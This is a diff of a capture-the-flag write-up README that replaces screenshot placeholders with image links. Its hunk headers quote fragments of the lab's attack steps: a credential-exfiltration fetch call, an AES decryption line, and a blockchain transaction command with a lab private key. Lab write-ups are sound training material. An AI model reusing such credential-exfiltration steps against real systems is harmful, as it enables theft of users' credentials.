@@ -153,7 +153,7 @@ const exfil_creds = await fetch(
 
 8. The response body contains a Base64-encoded message. Decoding it reveals **Flag 1** and a hint to proceed to the new endpoint `/supersecretotp`
 
-[SCREEN01]
+<img width="1921" height="575" alt="SCREEN01" src="https://github.com/user-attachments/assets/4d1df97b-d426-42ff-8ac7-4a4dcafc3f2a" />
 
 ---
 
@@ -421,7 +421,7 @@ result = decrypt(b64decode(result), AES_KEY).decode()
 print(result)
 ```
 
-[SCREEN02]
+<img width="1011" height="74" alt="SCREEN02" src="https://github.com/user-attachments/assets/707af972-bf2e-4ad8-be3f-129db3aba358" />
 
 ---
 
@@ -473,4 +473,4 @@ cast send --legacy --rpc-url http://geth:8545 --private-key 0x1f262f519f001ca7fc
 
 6. Go back to h`ttp://cdn.tryhackm3.loc:3000/` and click get flag button to displays **Flag 3**
 
-[SCREEN03]
+<img width="1237" height="765" alt="SCREEN03" src="https://github.com/user-attachments/assets/8180979f-978a-415b-9201-ce68e4b6a209" />
